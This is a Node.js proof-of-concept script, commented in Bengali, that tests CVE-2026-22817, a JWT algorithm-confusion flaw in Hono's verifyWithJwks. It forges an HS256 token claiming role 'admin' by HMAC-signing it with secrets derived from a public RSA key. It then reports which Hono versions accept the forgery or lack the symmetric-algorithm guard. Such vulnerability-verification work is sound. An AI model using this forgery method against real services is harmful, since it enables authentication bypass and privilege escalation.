// CVE-2026-22817 — Hono verifyWithJwks algorithm confusion (alg fallback to header)
// vulnerable line (4.11.3): alg: matchingKey.alg || header.alg
// fixed (4.11.4): header.alg আর ব্যবহার হয় না।
//
// DY-সীমা: attacker শুধু JWKS-এর PUBLIC RSA JWK জানে (kid k1, alg field নেই)।
// intended: RS256। attacker HS256 header বসিয়ে বিভিন্ন pubkey-material দিয়ে HMAC করে।
// চালাও:  node cve_2026_22817_hono.js <path-to-hono>
const crypto = require('crypto');
const honoPath = require('path').resolve(process.argv[2]);
const { verifyWithJwks } = require(require('path').join(honoPath, 'dist/cjs/utils/jwt/jwt.js'));
const ver = require(require('path').join(honoPath, 'package.json')).version;

function b64url(s){ return Buffer.from(s).toString('base64url'); }

async function main(){
  // issuer RSA keypair → public JWK (alg বাদ, kid=k1) — JWKS-এ এটাই থাকে
  const { publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });     // {kty:'RSA', n, e}
  delete jwk.alg; jwk.kid = 'k1';
  const options = { keys: [jwk] };

  const header = { alg: 'HS256', typ: 'JWT', kid: 'k1' };
  const payload = { role: 'admin', iss: 'real-issuer' };
  const hp = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}`;

  // attacker HMAC secret হিসেবে যা যা চেষ্টা করতে পারে (সব public-derived)
  const spkiPem = publicKey.export({ type: 'spki', format: 'pem' });
  const candidates = {
    'spki-PEM':  spkiPem,
    'jwk-JSON':  JSON.stringify(jwk),
    'jwk.n':     jwk.n,
    'spki-DER-b64': publicKey.export({ type: 'spki', format: 'der' }).toString('base64'),
  };

  console.log('='.repeat(70));
  console.log(`CVE-2026-22817 — Hono ${ver} verifyWithJwks (RSA JWK, alg বাদ)`);
  console.log('='.repeat(70));

  let forged = 0, vulnerable_algsel = 0;
  for (const [name, secret] of Object.entries(candidates)){
    const sig = crypto.createHmac('sha256', secret).update(hp).digest('base64url');
    try {
      const decoded = await verifyWithJwks(`${hp}.${sig}`, options);
      const admin = decoded && decoded.role === 'admin';
      forged = forged || (admin ? 1 : 0);
      console.log(`  [${admin?'A':'?'}] HS256 secret=${name.padEnd(13)} ACCEPT role=${decoded.role}` + (admin?'  🚨 REAL forgery':''));
    } catch(e){
      // মূল সূত্র: Hono কি attacker-এর HS256 নিয়ে এগোলো, নাকি নিজের guard-এ থামল?
      const guarded = e.name === 'JwtSymmetricAlgorithmNotAllowed'
        || /symmetric algorithm .* not allowed/i.test(e.message||'');
      if (!guarded) vulnerable_algsel = 1;   // guard নেই → attacker-এর alg গৃহীত (CVE আচরণ)
      const tag = guarded ? 'OK' : 'V';
      console.log(`  [${tag}] HS256 secret=${name.padEnd(13)} REJECT ${e.name}: ${String(e.message).slice(0,40)}` +
                  (guarded ? '  (guard: symmetric-not-allowed)' : '  ⚠️ attacker-alg গৃহীত, Web-Crypto-এ থামল'));
    }
  }
  console.log('-'.repeat(70));
  console.log(`  root cause: verifyWithJwks alg = matchingKey.alg || header.alg (attacker-controlled যখন JWK-তে alg নেই)`);
  console.log(`  full RSA→HMAC forgery: ${forged? 'হ্যাঁ':'না (Web Crypto RSA-JWK→HMAC import আটকায়)'}`);
  console.log(`  vulnerable algorithm-selection (no symmetric guard): ${vulnerable_algsel? 'হ্যাঁ (CVE আচরণ)':'না (guarded/fixed)'}`);
  console.log(`RESULT\tHono ${ver}\tforgery_TP=${forged}\talgsel_vuln=${vulnerable_algsel}`);
}
main().catch(e=>{ console.error('fatal', e); process.exit(2); });
